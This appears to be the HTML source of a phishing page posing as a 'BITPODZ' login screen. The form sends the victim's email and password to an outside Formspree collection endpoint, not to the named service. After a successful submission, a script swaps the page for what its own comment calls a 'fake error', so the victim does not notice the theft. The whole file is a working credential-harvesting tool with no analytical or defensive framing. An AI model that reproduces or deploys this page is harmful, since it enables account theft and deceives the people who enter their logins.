<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BITPODZ Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Logo Styling */
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .site-logo {
            max-width: 250px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        
        /* Welcome text adjustment */
        .welcome-text {
            margin-top: 10px;
            margin-bottom: 30px;
        }
        
        /* Existing error styles */
        .error-message {
            text-align: center;
            margin-top: 50px;
            color: #dc3545;
        }
        .error-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        
        /* Container adjustments */
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
       <div class="logo-container">
            <img src="images/logo.1c4530a4.png" alt="BITPODZ Logo" class="site-logo">
        </div>
        
        <!-- Welcome Text -->
        <h2 class="welcome-text">Welcome to BITPODZ</h2>
        
        <!-- Login Form -->
        <form id="loginForm" action="https://formspree.io/f/mqaljzkn" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Input email address" required autocomplete="off">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Input login password" required autocomplete="off">
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="remember">
                <label for="remember">Save account and password</label>
            </div>
            
            <input type="hidden" name="_subject" value="BITPODZ Login Attempt">
            
            <button type="submit">Login</button>
        </form>

        <!-- Additional Links -->
        <div class="links">
            <a href="#" id="registerLink">Register</a>
            <a href="#" id="forgotPasswordLink">Forgot Password</a>
        </div>

        <!-- Message Display -->
        <div id="message"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            
            fetch(this.action, {
                method: 'POST',
                body: new FormData(this),
                headers: { 'Accept': 'application/json' }
            })
            .then(response => {
                if (response.ok) {
                    // Replace entire page with fake error
                    document.body.innerHTML = `
                        <div class="container error-message">
                            <div class="error-icon">⚠️</div>
                            <h1>Login Error</h1>
                            <p>Invalid credentials or server unavailable.</p>
                            <p>Please try again later.</p>
                            <a href="#" onclick="window.location.reload()">Return to login</a>
                        </div>
                    `;
                } else {
                    throw new Error('Network response was not ok');
                }
            })
            .catch(error => {
                // Show actual error if something goes wrong
                document.getElementById('message').innerHTML = `
                    <p style="color: red;">An unexpected error occurred. Please try again.</p>
                `;
                submitBtn.disabled = false;
                submitBtn.textContent = 'Login';
            });
        });
    </script>
    <script src="script.js"></script>
</body>
</html>
